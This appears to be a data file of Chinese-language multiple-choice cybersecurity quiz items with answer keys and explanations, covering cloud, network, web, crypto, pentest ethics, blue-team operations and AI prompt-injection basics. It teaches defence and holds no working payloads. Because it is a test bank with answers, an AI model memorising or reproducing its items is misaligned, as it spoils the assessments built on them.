  { id:"pb4", cat:"pentest", level:"入门", q:"测试中意外发现范围外的严重漏洞时，正确做法是？", options:["立即通过约定渠道通报，不擅自扩大测试范围","继续深入测试并利用","直接公开披露","当作没看到"], answer:0, explain:"越界测试同样构成未授权访问；发现问题应第一时间通报，由授权方决定后续动作。" },
  { id:"nb3", cat:"network", level:"入门", q:"防火墙策略检查中最常见的配置问题是？", options:["放通规则过宽（如 any-any）或临时规则长期未回收","规则条数太少","设备品牌不统一","日志量太大"], answer:0, explain:"过宽与遗留的临时规则会抹掉分区隔离的效果，应定期复核并设置到期时间。" },
  { id:"nb4", cat:"network", level:"入门", q:"抓包时能看到明文内容，说明？", options:["该流量未加密，凭据与敏感数据可能被直接读取","该协议更安全","抓包工具出错","网络带宽不足"], answer:0, explain:"明文协议在链路上可被读取，应改用加密协议或隧道。" },
  { id:"cl3", cat:"cloud", level:"入门", q:"云上「安全组」的作用是？", options:["控制实例可被哪些来源访问哪些端口","自动备份数据","加密云盘","统计费用"], answer:0, explain:"安全组是最基础的网络访问控制，配置过宽（如 0.0.0.0/0 放通管理端口）是常见风险。" },
  { id:"cl4", cat:"cloud", level:"入门", q:"云账单突然大幅上升，安全上应优先排查？", options:["访问凭证是否泄露并被用于挖矿或资源滥用","网络是否波动","备份策略是否合理","实例规格是否够用"], answer:0, explain:"凭证泄露后的挖矿与资源滥用是账单暴涨的典型原因，应结合审计日志核查异常调用。" },
  { id:"bl3", cat:"blue", level:"入门", q:"蓝队指标 MTTD 指的是？", options:["从事件发生到被发现所需的时间","从发现到处置完成的时间","每月告警总数","设备在线率"], answer:0, explain:"MTTD 衡量发现能力，MTTR 衡量处置效率，两者是蓝队最核心的两个指标。" },
  { id:"bl4", cat:"blue", level:"入门", q:"日志集中收集的核心安全价值是？", options:["攻击者清理单台主机日志后仍可追溯","节省磁盘空间","提升查询速度","减少网络带宽"], answer:0, explain:"集中化与只追加存储能显著提高抗销毁能力，是取证与溯源的基础。" },
  { id:"mb3", cat:"mobile", level:"入门", q:"iOS 应用（IPA）解包后，配置信息主要位于？", options:["Info.plist","AndroidManifest.xml","build.gradle","strings.xml"], answer:0, explain:"iOS 侧的 ATS 例外、URL Scheme 等关键配置都在 Info.plist 中。" },
  { id:"mb4", cat:"mobile", level:"入门", q:"无障碍服务权限被恶意应用滥用的典型后果是？", options:["可读取屏幕内容并模拟点击，窃取信息或自动执行操作","仅影响电池续航","仅影响网络速度","没有任何实际影响"], answer:0, explain:"无障碍服务权限极强，是移动恶意软件窃取验证码与实施自动操作的核心手段。" },
  { id:"db3", cat:"datasec", level:"入门", q:"「准标识符组合」带来的隐私风险是？", options:["多个非唯一字段组合后可能重新识别到具体个人","提升数据库性能","减少存储占用","导致加密失败"], answer:0, explain:"生日、性别、邮编等组合常足以锁定个人，因此脱敏后仍需做重标识风险评估。" },
  { id:"db4", cat:"datasec", level:"入门", q:"发现共享链接为「任何人可访问」且无有效期，正确的处置是？", options:["立即收紧为需口令或指定范围，并核查是否已被异常访问","无需处理","只修改文件标题","仅通知管理员备案"], answer:0, explain:"无口令无期限的共享链接是数据泄露的高频入口，应先收紧再核查访问记录。" },
  { id:"sb5", cat:"supply", level:"入门", q:"要判断「线上是否受某依赖漏洞影响」，最依赖的前置能力是？", options:["依赖清单/SBOM 与资产台账","服务器的数量","防火墙的品牌","团队人数"], answer:0, explain:"没有组成清单与资产清单，影响面判定只能靠猜，响应速度会大幅下降。" },
  { id:"sb6", cat:"supply", level:"入门", q:"软件供应链四问中「谁能在其中插入东西」指向的是？", options:["代码仓库、构建与发布链路的权限管控","代码行数多少","使用的编程语言","部署在哪个机房"], answer:0, explain:"关注权限：谁有写权限、谁有发布权限、谁能读到签名密钥，决定了被污染的可能性。" },
  { id:"ab3", cat:"aisec", level:"入门", q:"为什么说「上下文里给什么，模型就更容易照着走」？", options:["模型把系统提示、用户输入与外部内容都当作指令通道处理","模型具有长期记忆","模型会自动联网检索","模型会自我训练"], answer:0, explain:"这是提示注入能够成立的根本原因，也是「把外部内容降权为数据」这条防御原则的由来。" },
  { id:"ab4", cat:"aisec", level:"入门", q:"AI 生成的代码进入生产前应当？", options:["按外部代码处理：人工评审 + 依赖与安全扫描","直接上线以节省时间","只要编译通过就可以","仅做格式化处理"], answer:0, explain:"模型输出可能含漏洞、不安全依赖或过时写法，必须纳入既有代码评审与扫描流程。" },
  { id:"ct27", cat:"soccti", level:"入门", q:"出现「告警没人认领」的组织性根因通常是？", options:["缺乏明确的告警归属与升级路径","安全设备数量太少","人员数量太多","网络带宽不足"], answer:0, explain:"职责不清会让告警在交接中流失，需明确归属与升级规则并写入值班流程。" },
  { id:"ct28", cat:"soccti", level:"入门", q:"日常安全运营中，「看得见」的前提条件是？", options:["关键系统与账号的日志已完整采集并集中留存","购买了大屏可视化工具","配置了更多告警规则","增加了值班人数"], answer:0, explain:"日志覆盖与保留是检测与溯源的地基，没有日志就只能靠猜。" },

  // ---- 领域补齐（v1.5.1 第六批）----
  { id:"nw1", cat:"network", level:"初级", q:"把内网数据库端口直接映射到公网，主要风险是？", options:["暴露面扩大，可被直接爆破或利用已知漏洞","提升访问速度","增加带宽消耗","影响 DNS 解析"], answer:0, explain:"管理面与数据库不应直接暴露公网；应走私网、跳板或访问代理。" },
  { id:"nw2", cat:"network", level:"初级", q:"NAT 在 IPv6 环境下失效带来的安全影响是？", options:["内网地址可直接被访问，遮蔽作用消失，暴露面管理更需显式","IPv6 更慢","IPv6 无法加密","IPv6 不支持防火墙"], answer:0, explain:"NAT 过去提供了一层「隐性遮蔽」，IPv6 下必须靠防火墙策略与显式最小放通。" },
  { id:"nw3", cat:"network", level:"中级", q:"企业无线安全的推荐做法是？", options:["使用 WPA2/3 企业级认证（802.1X）并把访客网与内网隔离","使用共享口令方便管理","开启 WPS 便于连接","让员工手机热点接入内网"], answer:0, explain:"企业级认证可追溯到人，访客隔离能避免「连上 Wi-Fi 就等于进内网」。" },
  { id:"nw4", cat:"network", level:"中级", q:"无线侧最容易被忽视的风险是？", options:["员工私接无线路由或个人热点连入内网","信号强度不足","路由器品牌不统一","天线数量不够"], answer:0, explain:"私接热点会绕过网络边界与准入控制，需要制度 + 技术双重约束。" },
  { id:"nw5", cat:"network", level:"高级", q:"DNS 隧道被用于隐蔽外联时，典型特征是？", options:["大量异常 DNS 查询与超长/编码子域","DNS 服务器宕机","TTL 值过小","使用了 IPv6"], answer:0, explain:"DNS 隧道把数据编码进域名，靠高频与异常长度可被识别，需结合基线检测。" },
  { id:"nw6", cat:"network", level:"高级", q:"判定长连接是「正常业务」还是「隐蔽通道」，关键看？", options:["目的地是否在资产与业务白名单内、数据量是否异常","连接是否加密","端口号是否常见","是否使用 TCP"], answer:0, explain:"端口与加密都可以伪装，目的地可解释性与数据量特征更可靠。" },
  { id:"nw7", cat:"network", level:"中级", q:"相比全流量采集，使用 NetFlow 元数据的优势是？", options:["轻量、可长期保留，适合做基线与异常发现","可以还原完整载荷内容","能解密 TLS","不需要存储"], answer:0, explain:"元数据适合长期基线与趋势分析；需要内容回溯时再启用全流量。" },
  { id:"nw8", cat:"network", level:"中级", q:"加密流量普及后，网络侧检测的重点转向？", options:["元数据与指纹（JA3/JA4、证书特征、行为模式）","解密所有流量内容","只看端口号","只看包大小"], answer:0, explain:"内容不可读时，指纹与行为特征成为主要判据，并需结合情报与资产上下文。" },
  { id:"cw1", cat:"cloud", level:"初级", q:"云上对象存储最常见的数据泄露原因是？", options:["存储桶被设为公开可读，或策略允许任意人访问","磁盘未格式化","实例规格过小","未开启 CDN"], answer:0, explain:"公开桶是云上大规模泄露的经典原因，应默认阻止公开并定期巡检。" },
  { id:"cw2", cat:"cloud", level:"初级", q:"对外分享云存储文件时，更安全的做法是？", options:["生成带有效期的签名链接而非设置公开策略","直接设为公开","把链接发到群里","复制到个人网盘"], answer:0, explain:"签名链接有时效与权限约束，避免文件长期暴露在公网。" },
  { id:"cw3", cat:"cloud", level:"中级", q:"安全组规则的常见高危配置是？", options:["0.0.0.0/0 放通远程管理与数据库端口","只放通 443","按源 IP 段放通","默认拒绝全部"], answer:0, explain:"管理面与数据库应仅从受控来源可达，配合跳板与私网访问。" },
  { id:"cw4", cat:"cloud", level:"中级", q:"云上「最小放通」原则的落地方式是？", options:["默认拒绝、只放通必要端口并限定来源范围","先全放通再慢慢收","只放通内网全部端口","按端口范围随意放通"], answer:0, explain:"先收紧再按需放通，并能说出每条规则对应的业务用途。" },
  { id:"cw5", cat:"cloud", level:"高级", q:"云上流水线使用长期密钥的主要风险是？", options:["密钥长期有效且权限常过大，泄露后可长期滥用云资源","构建速度变慢","镜像体积变大","日志量增加"], answer:0, explain:"推荐用 OIDC 换取短期凭证，并按最小权限设计部署角色。" },
  { id:"cw6", cat:"cloud", level:"高级", q:"云上部署角色的权限设计应遵循？", options:["最小权限：只允许部署所需的具体 API 与资源范围","与管理员同权限，方便排错","只限制网络访问即可","由团队成员自行决定"], answer:0, explain:"部署角色是流水线被利用后的直接后果面，必须按最小权限严格限定。" },
  { id:"cw7", cat:"cloud", level:"中级", q:"云上必设的高危告警不包括？", options:["服务器 CPU 使用率超过 50%","关闭或修改审计日志配置","创建管理员权限","网络规则放通管理端口给全网"], answer:0, explain:"CPU 告警属于运维监控；安全告警要盯权限、日志与网络策略的变更。" },
  { id:"cw8", cat:"cloud", level:"中级", q:"攻击者拿到云凭证后常做的第一件事是？", options:["尝试关闭或规避审计日志与告警","先备份数据","先升级实例规格","先通知管理员"], answer:0, explain:"因此日志需集中到独立账号且只追加，业务账号无权删除，才能保证事后可追溯。" },
  { id:"bw1", cat:"blue", level:"初级", q:"评估安全工具链是否「打通」的关键标准是？", options:["一条告警里能否看到资产、账号与历史行为并能直接处置","工具数量是否够多","界面是否好看","价格是否够高"], answer:0, explain:"数据与动作打通才减少人肉搬运，处置效率取决于此。" },
  { id:"bw2", cat:"blue", level:"初级", q:"安全运营工具链中，工单系统的主要作用是？", options:["跟踪处置过程、留存结论并支持复盘","替代 SIEM 做日志分析","阻断攻击流量","管理资产采购"], answer:0, explain:"工单保证闭环与可追溯，也是后续优化规则的事实依据。" },
  { id:"bw3", cat:"blue", level:"中级", q:"编写处置剧本时，必须明确的是？", options:["触发条件、所需数据、具体步骤、升级条件与联系人","脚本的编程语言","工具的采购渠道","团队的组织架构"], answer:0, explain:"剧本要在压力下可直接执行，因此需要具体动作与升级边界。" },
  { id:"bw4", cat:"blue", level:"中级", q:"剧本中最适合保留人工确认的部分是？", options:["有副作用的动作（隔离主机、封禁账号、删除邮件）","查询类动作","日志检索","生成报告"], answer:0, explain:"查询可自动化，有副作用的动作需人工确认以避免影响业务。" },
  { id:"bw5", cat:"blue", level:"中级", q:"威胁狩猎与「等告警」的本质区别是？", options:["狩猎由假设驱动，主动去找证据","狩猎只在下班后做","狩猎不需要数据","狩猎只用自动化工具"], answer:0, explain:"狩猎是假设驱动的主动搜索，与检测规则的被动触发互补。" },
  { id:"bw6", cat:"blue", level:"中级", q:"狩猎后发现「没有任何日志可查」，正确处理是？", options:["记录数据缺口并补日志/遥测，说明该路径当前不可见","结束狩猎并删除查询","认为假设不成立","改成监控 CPU"], answer:0, explain:"「看不见」本身就是结论，补数据是提升检测能力的直接收益。" },
  { id:"bw7", cat:"blue", level:"高级", q:"紫队演练的核心价值是？", options:["当场验证检测是否有效，并推动立即改进","评出红蓝双方胜负","产生一份报告","招募更多人员"], answer:0, explain:"紫队把攻击动作与检测能力对齐，重点在「能不能看见」而非输赢。" },
  { id:"bw8", cat:"blue", level:"高级", q:"紫队演练结果最应沉淀成什么？", options:["可重复的模拟动作库与检测规则回归用例","演练照片","参会名单","预算表"], answer:0, explain:"可重复才能持续回归，防止规则或模型变更后检测能力悄悄退化。" },
  { id:"cw9", cat:"crypto", level:"中级", q:"证书信任链校验通常包括？", options:["签名有效、域名匹配、未过期、未被吊销","只检查是否过期","只检查域名","只检查是否为自签"], answer:0, explain:"任一项缺失都会导致信任判断错误，需完整校验。" },
  { id:"cw10", cat:"crypto", level:"中级", q:"企业内代理抓包之所以可行，原理是？", options:["把自签根证书装入客户端信任库，从而签发被信任的中间证书","破解了 TLS 算法","关闭了客户端校验证书","使用了更强加密"], answer:0, explain:"因此「谁能安装根证书」是终端管控的重要边界。" },
  { id:"cw11", cat:"crypto", level:"初级", q:"数字签名主要提供？", options:["完整性与来源证明，不提供机密性","机密性与压缩","加密与解密","身份与备份"], answer:0, explain:"签名证明内容未改且来自私钥持有者；保密需要额外加密。" },
  { id:"cw12", cat:"crypto", level:"初级", q:"验签时最关键的前提是？", options:["签名者的公钥来自可信渠道","签名长度足够长","使用最新算法版本","签名速度足够快"], answer:0, explain:"公钥若不可信，攻击者可替换公钥后用自己私钥签名，验签形同虚设。" },
  { id:"cw13", cat:"crypto", level:"高级", q:"「先收集、后解密」威胁意味着？", options:["长期保密数据应优先迁移到抗量子方案","短期会话数据更需要保护","量子计算已经可用","加密不再必要"], answer:0, explain:"今天被截获的密文未来可能被解密，因此保密期长的数据优先级最高。" },
  { id:"cw14", cat:"crypto", level:"高级", q:"推进密码迁移时的工程能力指的是？", options:["密码敏捷性：算法与协议可快速替换而不改业务","只更换密钥长度","只升级 OpenSSL 版本","只在客户端改算法"], answer:0, explain:"敏捷性决定了未来面对算法失效时能否快速全局替换。" },
  { id:"pw1", cat:"pentest", level:"中级", q:"把「信息泄露 + 越权 + 上传」串成攻击链的意义是？", options:["说明真实风险远高于单个漏洞的独立评级","让报告更花哨","减少测试工作量","规避授权限制"], answer:0, explain:"单点低危组合起来可能直接导致接管，报告应给出攻击链与最坏影响。" },
  { id:"pw2", cat:"pentest", level:"中级", q:"记录攻击链时应重点包含？", options:["前置条件、可复现步骤与最终影响","测试人员心情","使用工具的版本号","测试耗时"], answer:0, explain:"可复现与影响判定是说服开发修复的关键，工具细节属于附录。" },
  { id:"pw3", cat:"pentest", level:"中级", q:"钓鱼演练中最应关注的正向指标是？", options:["上报率与上报平均耗时","点击率越高越成功","提交率越高越好","邮件投递成功率"], answer:0, explain:"演练目标是让人更快上报，点击率与提交率下降是结果而非考核指标。" },
  { id:"pw4", cat:"pentest", level:"中级", q:"钓鱼演练设计时应当避免的是？", options:["使用造成恐慌的内容（如裁员、事故通知）","使用贴合业务的真实场景模板","提供一键上报通道","对高权限岗位单独设计场景"], answer:0, explain:"演练要避免引发恐慌或影响正常业务，同时保证有上报通道与事后培训。" },
  { id:"pw5", cat:"pentest", level:"初级", q:"渗透报告中的修复建议应当？", options:["具体到可执行的配置或代码位置","只写「加强校验」","只引用标准编号","交给开发自行判断"], answer:0, explain:"可落地的建议才能被修复，也便于复测确认问题是否真正解决。" },
  { id:"pw6", cat:"pentest", level:"初级", q:"渗透测试的闭环通常以什么为终点？", options:["复测确认问题已修复（或已接受风险）","提交报告即结束","付款完成","下一次测试开始"], answer:0, explain:"没有复测就没有闭环；未修复项应显式记录为已接受风险。" },
  { id:"bw9", cat:"binary", level:"高级", q:"NX 保护开启后，攻击者转向 ROP 的原因是？", options:["无法在栈上执行注入代码，只能复用已有代码片段","ROP 更快","栈溢出不再可能","ASLR 失效"], answer:0, explain:"ROP 复用程序中已有的指令片段来构造逻辑，绕过「不可执行」的限制。" },
  { id:"bw10", cat:"binary", level:"高级", q:"从防守角度降低 ROP 可行性的做法是？", options:["开启 PIE/NX/Canary/CET 等缓解并及时修补内存漏洞","关闭 ASLR 便于调试","静态链接所有库","减少日志输出"], answer:0, explain:"完整缓解组合能显著提高利用难度，源头仍是减少内存漏洞。" },
  { id:"mw1", cat:"mobile", level:"高级", q:"移动逆向中最值得优先追踪的目标是？", options:["客户端本地做的安全判断与硬编码密钥","界面布局代码","图片资源","字体文件"], answer:0, explain:"本地判断与硬编码密钥可被绕过或提取，影响最大，应优先验证并推动服务端补强。" },
  { id:"mw2", cat:"mobile", level:"高级", q:"完成客户端绕过验证后，报告应重点给出？", options:["服务端应如何补强（风控、限速、权限校验）","更复杂的绕过脚本","加固产品推荐","客户端混淆方案"], answer:0, explain:"客户端防护只能提高成本，真正的修复落在服务端校验与风控。" },
  { id:"dw1", cat:"datasec", level:"中级", q:"数据网关解决的核心问题是？", options:["把数据库访问收敛到统一入口以做鉴权、脱敏与审计","提升数据库性能","减少存储成本","加速备份"], answer:0, explain:"散落的直连无法统一管控，收敛入口才能让权限与审计真正生效。" },
  { id:"dw2", cat:"datasec", level:"中级", q:"动态脱敏相比静态脱敏的优势是？", options:["同一份数据可按访问者角色返回不同结果（如打码）","性能更高","无需规则配置","可完全替代加密"], answer:0, explain:"动态脱敏在生产查询场景即可生效，适合「既要能用又要少暴露」的需求。" },
  { id:"sw1", cat:"supply", level:"中级", q:"制品仓库开启「标签不可变」的目的是？", options:["防止同一标签被覆盖推送，保证部署来源可追溯","节省存储空间","加快拉取速度","减少镜像层数"], answer:0, explain:"允许覆盖会让「镜像内容与记录不一致」，破坏可追溯性与签名意义。" },
  { id:"sw2", cat:"supply", level:"中级", q:"镜像准入控制通常要求？", options:["仅允许来自内部仓库且带签名的镜像，并限制高危漏洞","允许任意公共镜像","只检查镜像大小","只检查构建时间"], answer:0, explain:"准入把「不可信来源」挡在集群之外，是供应链防护的关键落点。" },
  { id:"aiw1", cat:"aisec", level:"中级", q:"判断「提示词是否被当成了安全防线」，一个实用的检验是？", options:["把提示词整段删掉，系统是否仍然安全","提示词是否足够长","是否用了英文","是否包含示例"], answer:0, explain:"安全职责应在代码层（权限、白名单、校验），提示词只负责体验与风格。" },
  { id:"aiw2", cat:"aisec", level:"中级", q:"提示词与工具配置为什么需要版本管理与回归？", options:["它们等价于生产配置，改动可能引入安全退化","为了好看","因为体积大","因为要付费"], answer:0, explain:"提示词或工具的细微改动可能让既有防护失效，需回归验证。" },
  { id:"tw1", cat:"soccti", level:"高级", q:"桌面推演的主要价值是？", options:["暴露流程与联系人的缺口，而非检验技术工具","评估员工绩效","替代真实演练","减少安全预算"], answer:0, explain:"推演以低成本暴露「谁在什么时候做什么」的断点，改进项需落责任与期限。" },
  { id:"tw2", cat:"soccti", level:"高级", q:"演练结束后最关键的动作是？", options:["把卡点转成改进项，明确责任人与期限并复验","发布演练通稿","统计参与人数","归档照片"], answer:0, explain:"没有改进项闭环的演练只产生文档，不产生能力。" },

  // ---- 领域补齐（v1.5.1 第七批）----
  { id:"nx1", cat:"network", level:"中级", q:"远程接入（VPN）安全最关键的加固项是？", options:["强制双因素认证并限定接入后可访问的网段","更换 VPN 设备品牌","提升带宽","开启更多加密套件"], answer:0, explain:"账号共享与过宽可达是远程接入的典型问题，MFA + 最小可达能显著降低风险。" },
  { id:"nx2", cat:"network", level:"中级", q:"为什么 VPN 设备自身漏洞值得高度关注？", options:["它暴露在公网且直通内网，一旦被利用等于直接被突破边界","它消耗带宽","它影响 DNS","它只在夜间运行"], answer:0, explain:"边界设备是高价值目标，需及时更新固件并限制管理面暴露。" },
  { id:"nx3", cat:"network", level:"高级", q:"做网络分区时，最重要的输入是？", options:["业务之间「谁需要访问谁」的连通关系","交换机的品牌","机房的面积","员工的座位表"], answer:0, explain:"分区策略要基于真实业务依赖，否则不是放太宽就是影响业务而被迫全放通。" },
  { id:"nx4", cat:"network", level:"高级", q:"微隔离相比网段级隔离的优势是？", options:["按身份/标签做到主机级最小可达，限制横向移动更彻底","配置更少","不需要日志","性能更好"], answer:0, explain:"微隔离粒度更细但维护成本更高，通常从流量基线自动学习逐步收敛。" },
  { id:"nx5", cat:"network", level:"中级", q:"DNS 查询日志对安全运营的价值是？", options:["可发现恶意域名解析、DNS 隧道与异常外联","提升解析速度","减少带宽","加密查询内容"], answer:0, explain:"DNS 日志是检测隐蔽通道与外联的关键数据源，应集中留存并接入检测。" },
  { id:"nx6", cat:"network", level:"中级", q:"企业启用加密 DNS（DoH）可能带来的影响是？", options:["安全侧可见性下降，需在策略上权衡或统一出口","DNS 解析变慢","无法访问外网","域名无法解析"], answer:0, explain:"DoH 能提升隐私，但会绕过企业 DNS 监控，需要策略与统一出口配合。" },
  { id:"cx1", cat:"cloud", level:"中级", q:"云原生环境中存储密钥的正确做法是？", options:["使用密钥管理服务并按需注入临时凭据","写进 ConfigMap","打包进镜像","明文放环境变量"], answer:0, explain:"ConfigMap 与镜像都是明文可见的，密钥必须走密钥服务并按最小权限注入。" },
  { id:"cx2", cat:"cloud", level:"中级", q:"读取密钥的权限为什么要单独收敛？", options:["被攻陷的工作负载若可直接读密钥，等于直接提权","为了减少日志","为了节省费用","为了加快启动"], answer:0, explain:"密钥是高价值目标，权限过宽会让一次容器失陷升级为账号级失陷。" },
  { id:"cx3", cat:"cloud", level:"中级", q:"为什么容器镜像需要定期重建？", options:["上游基础层的补丁不会自动进入已有镜像，重建才能带上修复","为了减小体积","为了更换基础镜像品牌","为了提升启动速度"], answer:0, explain:"老镜像等于长期携带旧漏洞，固定节奏重建是必要治理动作。" },
  { id:"cx4", cat:"cloud", level:"中级", q:"镜像瘦身的安全意义是？", options:["去掉编译器与调试工具，减少被利用的工具与组件面","提升构建速度","减少镜像数量","降低推送频率"], answer:0, explain:"越少的组件意味着越少的漏洞面与更少的可用工具。" },
  { id:"cx5", cat:"cloud", level:"高级", q:"多账号云环境统一治理的基础是？", options:["集中审计（业务账号无权删除）与组织级策略基线","统一计费","统一界面皮肤","统一实例规格"], answer:0, explain:"集中审计保证事后可追溯，组织策略保证基线不被绕过。" },
  { id:"cx6", cat:"cloud", level:"高级", q:"多云治理最容易失控的是？", options:["身份与权限分散在各云，没有统一台账与复核","网络带宽","存储容量","镜像数量"], answer:0, explain:"身份与权限是云上安全的核心，必须建立统一台账与定期复核机制。" },
  { id:"bx1", cat:"blue", level:"中级", q:"防守方做威胁建模的首要输入是？", options:["关键资产与其暴露面","安全设备清单","团队成员数量","预算规模"], answer:0, explain:"先明确要保护什么、对手可能从哪进来，才能决定监控与加固的优先级。" },
  { id:"bx2", cat:"blue", level:"中级", q:"威胁模型需要更新的触发条件是？", options:["上线新系统或开放新接口等攻击面变化","更换办公软件","调整排班","更换打印机"], answer:0, explain:"攻击面变了，防护与检测的重点也要跟着变，否则会出现监控盲区。" },
  { id:"bx3", cat:"blue", level:"中级", q:"最适合优先自动化的处置动作是？", options:["情报查询与告警富化等只读动作","隔离核心数据库服务器","批量删除账号","修改生产网络策略"], answer:0, explain:"先从只读、可回滚的动作开始，有副作用的动作保留人工确认。" },
  { id:"bx4", cat:"blue", level:"中级", q:"自动化的主要风险是？", options:["把错误的判断大规模执行，影响业务","运行速度太快","占用磁盘空间","需要更多人力"], answer:0, explain:"因此需要白名单、可回滚、执行留痕与失败告警，并定期抽查执行效果。" },
  { id:"bx5", cat:"blue", level:"初级", q:"给管理层的安全月报，重点应是？", options:["关键风险、趋势变化与需要的决策支持","告警总条数","设备型号清单","团队加班时长"], answer:0, explain:"管理层需要的是风险与决策依据，技术细节放在附录。" },
  { id:"bx6", cat:"blue", level:"初级", q:"衡量安全运营趋势的合适指标组合是？", options:["MTTD/MTTR、关键资产覆盖率、漏检复盘数","告警总数与关闭数","设备数量与价格","值班人数"], answer:0, explain:"关注发现与处置效率、覆盖能力与漏检改进，而非数量堆砌。" },
  { id:"wx1", cat:"web", level:"初级", q:"检测接口是否存在对象级越权，最直接的方法是？", options:["用 A 账号的令牌请求 B 账号的资源 id","查看接口文档版本号","测量响应时间","检查是否有验证码"], answer:0, explain:"对象级授权缺失是 API 最常见的高危问题，验证方式就是交叉替换资源标识。" },
  { id:"wx2", cat:"web", level:"初级", q:"API 上线的必备防护不包括？", options:["接口返回尽量详细的堆栈信息便于排错","认证与授权校验","频率限制","参数类型与范围校验"], answer:0, explain:"详细错误信息会泄露内部细节，应统一化并记录到服务端日志。" },
  { id:"wx3", cat:"web", level:"中级", q:"登录成功后重新生成会话 ID 的目的是？", options:["防止会话固定攻击（攻击者预先设定会话 ID）","提升登录速度","减少 Cookie 体积","兼容旧浏览器"], answer:0, explain:"会话固定利用登录前后会话不变的特点劫持会话，重新生成即可防御。" },
  { id:"wx4", cat:"web", level:"中级", q:"找回密码流程的设计要点是？", options:["令牌随机、一次性、有时效，且不泄露账号是否存在","用账号名作为令牌","令牌永久有效","允许无限次尝试"], answer:0, explain:"找回流程是账号接管的高发点，令牌强度与信息泄露都要控制。" },
  { id:"wx5", cat:"web", level:"中级", q:"文件上传功能的安全做法是？", options:["按内容白名单校验类型、随机化文件名并存到不可执行位置","只校验扩展名","保留原文件名放在网站目录","允许上传任意大小"], answer:0, explain:"扩展名可伪造、原文件名可能带路径；内容校验 + 改名 + 隔离存储是基本组合。" },
  { id:"wx6", cat:"web", level:"中级", q:"上传功能出现「图片马」风险的原因是？", options:["文件同时包含图片与可执行代码，可能被解析执行或被包含利用","图片体积过大","图片格式不支持","上传速度慢"], answer:0, explain:"因此需要内容重整（重新编码图片）并确保存储位置不可执行。" },
  { id:"wx7", cat:"web", level:"中级", q:"SSRF 最危险的后果之一是？", options:["读取云实例元数据获取临时凭证，进而控制云资源","页面加载变慢","图片显示异常","Cookie 丢失"], answer:0, explain:"云上 SSRF 常升级为凭证窃取，需强制 IMDSv2 并限制出网。" },
  { id:"wx8", cat:"web", level:"中级", q:"防御 SSRF 时，为什么「先解析后校验」很重要？", options:["可防止攻击者用域名解析到内网地址绕过字符串校验","能提升解析速度","可减少 DNS 查询","能兼容更多域名"], answer:0, explain:"只做字符串白名单会被 DNS 解析与重绑定绕过，必须对解析结果做内网地址判定。" },
  { id:"bz1", cat:"binary", level:"高级", q:"UAF（释放后使用）漏洞的本质是？", options:["指针所指向的内存已被释放并可能被复用，继续使用会操作他人数据","内存从未分配","程序无法运行","栈被清空"], answer:0, explain:"释放后内存可能被分配给别的对象，继续访问等于读写别人的数据，可被用于劫持。" },
  { id:"bz2", cat:"binary", level:"高级", q:"降低堆漏洞影响面最根本的方向是？", options:["使用内存安全语言与静态/动态分析减少此类缺陷","关闭日志","增加内存容量","降低并发"], answer:0, explain:"分配器加固能提高利用难度，但减少缺陷本身才是最根本的。" },
  { id:"bz3", cat:"binary", level:"中级", q:"模糊测试中，覆盖率的意义是？", options:["衡量探索到了多少代码路径，决定能否挖到更深的问题","衡量崩溃个数","衡量运行时间","衡量内存占用"], answer:0, explain:"没有覆盖率的增长，长时间运行也在原地打转；崩溃去重与最小化同样重要。" },
  { id:"bz4", cat:"binary", level:"中级", q:"fuzzing 发现崩溃后，为什么要做输入最小化？", options:["便于开发复现与定位根因，并可作为回归用例","为了减小文件体积","为了提升 fuzz 速度","为了隐藏漏洞"], answer:0, explain:"最小化后的样本更易复现与调试，也适合长期回归。" },
  { id:"cy1", cat:"crypto", level:"中级", q:"从用户口令派生加密密钥时，正确做法是？", options:["使用带盐与足够代价的 KDF（如 PBKDF2/argon2）","直接 SHA256(口令)","直接使用口令字节","Base64 编码口令"], answer:0, explain:"直接哈希无盐且过快，无法抵抗暴力与彩虹表攻击。" },
  { id:"cy2", cat:"crypto", level:"中级", q:"KDF 的「代价参数」需要随什么调整？", options:["硬件性能提升（保证破解成本不下降）","用户数量","服务器数量","网络带宽"], answer:0, explain:"硬件越来越快，代价参数需要定期评估上调以维持安全边际。" },
  { id:"cy3", cat:"crypto", level:"中级", q:"TLS 配置中应禁用的协议版本是？", options:["SSLv3 与 TLS 1.0/1.1","TLS 1.2","TLS 1.3","全部版本"], answer:0, explain:"老版本存在已知弱点，应只保留 1.2（尽量 1.3）并优先 AEAD 套件。" },
  { id:"cy4", cat:"crypto", level:"中级", q:"「加密了但不完整」指的是？", options:["只加密未做完整性校验，密文可被篡改而不被发现","加密强度不足","密钥太短","未使用 https"], answer:0, explain:"应使用 AEAD（带认证的加密）或额外加签名/MAC，避免可篡改的密文。" },
  { id:"px1", cat:"pentest", level:"中级", q:"为什么同一业务的多端（Web/App）要一起测？", options:["各端校验强度可能不一致，宽松的一端会绕过严格的一端","为了增加工作量","因为客户要求","为了收集截图"], answer:0, explain:"多端一致性缺失是系统性风险，应作为整体评估而非单点问题。" },
  { id:"px2", cat:"pentest", level:"中级", q:"前端做的限制（隐藏按钮、金额校验）在安全上的意义是？", options:["仅用于体验优化，不能作为安全控制","等同于服务端校验","可防止越权","可防止篡改"], answer:0, explain:"客户端逻辑可被绕过，真正的校验必须在服务端完成。" },
  { id:"px3", cat:"pentest", level:"初级", q:"复测的正确做法是？", options:["用原复现步骤验证，并检查同类问题是否一并修复","只看开发提交的说明","只跑一遍扫描器","等下次测试再看"], answer:0, explain:"复测要给出实际结果证据，并关注同模式的其他位置。" },
  { id:"px4", cat:"pentest", level:"初级", q:"对确实无法修复的问题，应如何处理？", options:["登记为已接受风险，明确责任人与补偿措施","从报告中删除","标记为已修复","忽略不提"], answer:0, explain:"显式记录与补偿控制（如加监控）比隐匿更安全，也便于后续复评。" },
  { id:"mx1", cat:"mobile", level:"中级", q:"MDM 落地时需要平衡的核心矛盾是？", options:["企业数据可控与员工个人隐私","设备价格与性能","系统版本与界面","网络速度与容量"], answer:0, explain:"企业数据容器化、个人数据不监控，是兼顾安全与隐私的常见做法。" },
  { id:"mx2", cat:"mobile", level:"中级", q:"把设备合规状态作为访问决策输入，属于哪种思路？", options:["零信任：按身份与设备状态动态授权","传统边界防护","仅网络层控制","仅口令认证"], answer:0, explain:"零信任不因「在内网」就信任，而是每次访问都校验身份与设备健康状态。" },
  { id:"dx1", cat:"datasec", level:"高级", q:"令牌化与脱敏的关键区别是？", options:["令牌化可逆且保留格式（便于业务使用），脱敏通常只用于展示","令牌化更便宜","脱敏更安全","两者完全相同"], answer:0, explain:"令牌化适用于业务需要原值可查的场景，映射关系必须严格保管。" },
